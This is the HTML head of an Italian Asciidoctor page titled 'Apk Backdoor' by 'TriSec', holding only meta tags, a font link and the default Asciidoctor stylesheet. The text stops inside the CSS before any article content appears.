<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.10">
<meta name="author" content="TriSec">
<title>Apk Backdoor</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment @import statement to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0;direction:ltr}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{display:table-cell;line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed;word-wrap:break-word}
:not(pre)>code.nobreak{word-wrap:normal}
:not(pre)>code.nowrap{white-space:nowrap}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:100%;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details>summary:first-of-type{cursor:pointer;display:list-item;outline:none;margin-bottom:.75em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6)}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{-webkit-border-radius:4px;border-radius:4px;word-wrap:break-word;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class="highlight"],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos{border-right:1px solid currentColor;opacity:.35;padding-right:.5em}
pre.pygments .lineno{border-right:1px solid currentColor;opacity:.35;display:inline-block;margin-right:.75em}
pre.pygments .lineno::before{content:"";margin-right:-.125em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;text-align:left;margin-right:0}
table.tableblock{max-width:100%;border-collapse:separate}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
td.tableblock>.content>:last-child.sidebarblock{margin-bottom:0}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>thead>tr>.tableblock,table.grid-all>tbody>tr>.tableblock{border-width:0 1px 1px 0}
table.grid-all>tfoot>tr>.tableblock{border-width:1px 1px 0 0}
table.grid-cols>*>tr>.tableblock{border-width:0 1px 0 0}
table.grid-rows>thead>tr>.tableblock,table.grid-rows>tbody>tr>.tableblock{border-width:0 0 1px}
table.grid-rows>tfoot>tr>.tableblock{border-width:1px 0 0}
table.grid-all>*>tr>.tableblock:last-child,table.grid-cols>*>tr>.tableblock:last-child{border-right-width:0}
table.grid-all>tbody>tr:last-child>.tableblock,table.grid-all>thead:last-child>tr>.tableblock,table.grid-rows>tbody>tr:last-child>.tableblock,table.grid-rows>thead:last-child>tr>.tableblock{border-bottom-width:0}
table.frame-all{border-width:1px}
table.frame-sides{border-width:0 1px}
table.frame-topbot,table.frame-ends{border-width:1px 0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd),table.stripes-even tr:nth-of-type(even),table.stripes-hover tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{display:table-cell;line-height:1.6;background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);-webkit-border-radius:100px;border-radius:100px;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
